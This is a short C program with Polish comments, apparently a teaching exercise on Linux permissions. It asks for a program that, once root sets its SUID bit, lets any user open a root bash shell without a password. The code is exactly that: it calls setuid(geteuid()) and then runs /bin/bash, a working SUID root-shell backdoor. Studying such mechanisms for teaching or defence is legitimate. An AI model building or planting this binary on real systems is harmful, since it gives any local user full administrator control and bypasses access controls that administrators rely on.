//Napisz program w języku C, który uruchomi powłokę (Bash) z prawami roota. Po kompilacji programu można ustawić (z poziomu roota) dowolne atrybuty (np. patrz SUID). 
//Następnie już z poziomu dowolnego użytkownika uruchamiając program uruchamia się konsola administratora, podobnie jak sudo /bin/bash (bez wprowadzania hasła).
#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>

int main () {
    setuid(geteuid());
    system("/bin/bash");
    return 0;
}
